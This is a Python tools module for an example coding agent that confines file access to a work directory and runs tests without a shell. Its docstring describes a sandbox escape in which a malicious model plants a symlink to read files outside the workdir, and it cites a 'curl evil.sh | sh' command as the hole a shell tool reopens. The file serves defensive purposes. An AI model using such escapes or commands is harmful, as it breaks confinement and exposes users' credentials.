"""Tool implementations for the coding-agent example.

Four tools, exposed to the agent via the pipeline's agent_loop config and
dispatched through call_target (`fn:tools:read_file`, etc.):

- read_file(path)   — return file contents
- edit_file(path, old_string, new_string) — exact-string replacement
- run_tests(test)   — run a test file with a fixed interpreter (no shell)
- done(summary)     — terminator: signal task complete, carry a summary

SECURITY (hardened after the opus security review, 2026-06-23):
All filesystem access is CONFINED to a work directory named by the
`YAAH_CODING_AGENT_WORKDIR` environment variable. The tools REFUSE to run
if it is unset — defaulting to the current directory would silently make
the whole CWD (often a home dir, with ~/.aws/credentials and ~/.zshrc in
reach) the "safe" zone. Confinement defends against:

- path traversal (`../`) and absolute escapes — `_resolve_within` rejects
  any path that resolves outside the workdir;
- symlink-target swap (the TOCTOU the review demonstrated: a malicious
  model's `edit_file` plants a symlink at an in-workdir name, then
  `read_file` follows it out) — the final open uses `O_NOFOLLOW`, so a
  symlink at the target is refused at open time, not just at check time.

`run_tests` replaces the original `run_bash`: it runs a FIXED argv
(`[python, <confined test path>]`) with `shell=False`, so there is no
arbitrary-command surface. An author who genuinely needs a general shell
tool can add one back, but should understand they are re-opening the
`curl evil.sh | sh` hole — see the README's "Honest limits" section.

Residual risk (acceptable for an example, documented honestly): a symlink
swapped into an INTERMEDIATE directory mid-resolution is not closed by
O_NOFOLLOW alone (that needs openat2/RESOLVE_BENEATH, not in the stdlib).
A production tool would open the workdir as a dir fd and resolve
component-by-component. The string containment + final-component
O_NOFOLLOW closes the demonstrated escape; the rest is documented.

Targets Python 3.9+.
"""
from __future__ import annotations

import os
import subprocess
import sys
from typing import Any, Dict, Optional


class _Rejected(Exception):
    """Raised when a tool refuses an operation; carries a model-facing reason."""


def _workdir() -> str:
    wd = os.environ.get("YAAH_CODING_AGENT_WORKDIR")
    if not wd:
        raise _Rejected(
            "YAAH_CODING_AGENT_WORKDIR is not set — refusing to touch the "
            "filesystem without an explicit, confined work directory. Set it "
            "to the directory the agent is allowed to edit.")
    return os.path.realpath(wd)


def _resolve_within(path: Any) -> Optional[str]:
    """Resolve `path` (relative -> against the workdir) to an absolute realpath
    and confirm it stays inside the workdir. Returns the safe abspath, or None
    if it escapes / is malformed. `realpath` canonicalizes `..` and symlinks
    before the containment check; the `wd + os.sep` form defeats the classic
    sibling-prefix bypass (`/work` vs `/work-evil`)."""
    if not isinstance(path, str) or not path:
        return None
    wd = _workdir()
    try:
        candidate = path if os.path.isabs(path) else os.path.join(wd, path)
        real = os.path.realpath(candidate)
    except ValueError:                         # embedded NUL byte
        return None
    if real == wd or real.startswith(wd + os.sep):
        return real
    return None


def _open_confined(path: Any, mode: str):
    """Open `path` confined to the workdir, refusing a symlink at the target
    (O_NOFOLLOW closes the check-then-open TOCTOU the string check can't).
    Raises _Rejected with a model-facing reason on any refusal."""
    safe = _resolve_within(path)
    if safe is None:
        raise _Rejected(
            "path {!r} is outside the working directory (or malformed) — "
            "the agent may only touch files under "
            "YAAH_CODING_AGENT_WORKDIR".format(path))
    if mode == "r":
        flags = os.O_RDONLY | os.O_NOFOLLOW
    elif mode == "w":
        flags = os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW
    else:
        raise _Rejected("unsupported open mode {!r}".format(mode))
    try:
        fd = os.open(safe, flags, 0o644)
    except OSError as e:
        # ELOOP = symlink refused by O_NOFOLLOW; ENOENT = missing; etc.
        raise _Rejected("cannot open {!r}: {}".format(path, e.strerror or e))
    return os.fdopen(fd, mode, encoding="utf-8")


def read_file(args: Dict[str, Any]) -> str:
    try:
        with _open_confined(args.get("path"), "r") as f:
            return f.read()
    except _Rejected as e:
        return "error: {}".format(e)
    except IsADirectoryError:
        return "error: {} is a directory, not a file".format(args.get("path"))
    except Exception as e:
        return "error: {}: {}".format(type(e).__name__, e)


def edit_file(args: Dict[str, Any]) -> str:
    # Non-atomic: a crash between read and write loses the file. Fine for an
    # example fixture; production tools would write-then-rename via tempfile.
    path = args.get("path")
    old = args.get("old_string")
    new = args.get("new_string")
    if not all(isinstance(x, str) for x in (old, new)):
        return "error: edit_file requires 'old_string' and 'new_string' strings"
    if old == new:
        return "error: old_string == new_string — refusing a no-op edit"
    try:
        with _open_confined(path, "r") as f:
            text = f.read()
    except _Rejected as e:
        return "error: {}".format(e)
    except FileNotFoundError:
        return "error: no such file: {}".format(path)
    count = text.count(old)
    if count == 0:
        return ("error: old_string not found in {}. The file has not been changed. "
                "Read the file again and pass an old_string that appears verbatim.".format(path))
    if count > 1:
        return ("error: old_string appears {} times in {}. Provide a longer / more "
                "unique old_string so the edit is unambiguous.".format(count, path))
    new_text = text.replace(old, new, 1)
    try:
        with _open_confined(path, "w") as f:
            f.write(new_text)
    except _Rejected as e:
        return "error: {}".format(e)
    return "ok: edited {} (1 replacement)".format(path)


def run_tests(args: Dict[str, Any]) -> Dict[str, Any]:
    """Run a test file with a FIXED argv ([python, <confined path>]) and
    shell=False. No arbitrary-command surface: a shell metacharacter in the
    `test` argument is just a (missing) path, never executed."""
    test = args.get("test", "test_is_fizzbuzz.py")
    safe = _resolve_within(test)
    if safe is None:
        return {"error": "test path {!r} is outside the working directory".format(test)}
    try:
        wd = _workdir()
    except _Rejected as e:
        return {"error": str(e)}
    try:
        proc = subprocess.run([sys.executable, safe], cwd=wd, shell=False,
                              capture_output=True, text=True, timeout=60)
    except subprocess.TimeoutExpired as e:
        return {"error": "timeout after 60s",
                "stdout": (e.stdout.decode(errors="replace") if e.stdout else "")[-2000:],
                "stderr": (e.stderr.decode(errors="replace") if e.stderr else "")[-2000:]}
    return {"exit_code": proc.returncode,
            "stdout": (proc.stdout or "")[-4000:],
            "stderr": (proc.stderr or "")[-2000:]}


def done(args: Dict[str, Any]) -> Dict[str, Any]:
    summary = args.get("summary", "")
    return {"done": True, "summary": str(summary)}
